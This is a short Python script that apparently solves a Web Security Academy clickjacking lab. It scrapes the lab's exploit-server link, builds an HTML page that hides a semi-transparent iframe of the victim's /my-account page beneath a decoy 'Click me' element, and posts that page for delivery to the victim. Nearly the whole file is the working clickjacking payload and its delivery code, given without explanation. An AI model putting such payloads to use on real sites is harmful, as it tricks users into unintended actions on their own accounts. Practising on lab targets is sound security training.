import requests
from bs4 import BeautifulSoup

site = 'ace51f241e3a9908c017805e006d00f7.web-security-academy.net'

s = requests.Session()
site_url = f'https://{site}/'
resp = s.get(site_url)
soup = BeautifulSoup(resp.text,'html.parser')
exploit_url = soup.find('a', {'id':'exploit-link'}).get('href')

exploit_html = f'''<style>
   iframe {{
       position:relative;
       width: 700px;
       height: 700px;
       opacity: 0.3;
       z-index: 2;
   }}
   div {{
       position:absolute;
       top:530px;
       left:60px;
       z-index: 1;
   }}
</style>
<div>Click me</div>
<iframe src="https://{site}/my-account"></iframe>
'''

formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'DELIVER_TO_VICTIM'
}

resp = s.post(exploit_url, data=formData)